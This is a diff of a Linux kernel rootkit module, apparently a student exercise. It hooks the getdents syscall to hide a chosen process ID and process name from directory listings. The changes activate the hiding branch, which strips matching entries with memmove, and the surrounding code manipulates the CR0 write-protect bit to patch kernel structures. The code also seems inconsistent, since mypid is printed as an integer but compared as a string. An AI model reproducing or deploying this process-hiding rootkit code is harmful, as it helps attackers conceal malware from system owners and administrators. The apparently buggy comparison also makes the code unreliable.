@@ -53,7 +53,7 @@ struct linux_dirent __user *dirp, unsigned int count);
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage long sneaky_sys_getdents(unsigned int fd, 
 struct linux_dirent __user *dirp, unsigned int count){
-  printk(KERN_INFO "pid = %d\n", mypid);
+  //printk(KERN_INFO "pid = %d\n", mypid);
   long value;
   unsigned short len = 0;
   unsigned short tlen = 0;
@@ -62,17 +62,18 @@ struct linux_dirent __user *dirp, unsigned int count){
   while(tlen > 0 ) {
     len = dirp->d_reclen;
     tlen -= len;
-    printk("%s\n", dirp->d_name);
-    /*if( strcmp(dirp->d_name, proc_dir) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
+    //printk("%s\n", dirp->d_name);
+    if( strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
+      printk("%s\n", dirp->d_name);
       memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
       value -= len;
       printk(KERN_INFO "hide successful\n");
-    }*/
+    }
     if(tlen) {
       dirp = (struct linux_dirent* ) ((char*) dirp + dirp->d_reclen);
     }
   }
-  printk(KERN_INFO "finished hacked_getdents.\n");
+  //printk(KERN_INFO "finished hacked_getdents.\n");
   return value;
 }
 
@@ -103,7 +104,7 @@ static int initialize_sneaky_module(void)
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 
-  strcat(proc_dir, mypid);
+  //strcat(proc_dir, mypid);
 
   return 0;       // to show a successful load 
 }  
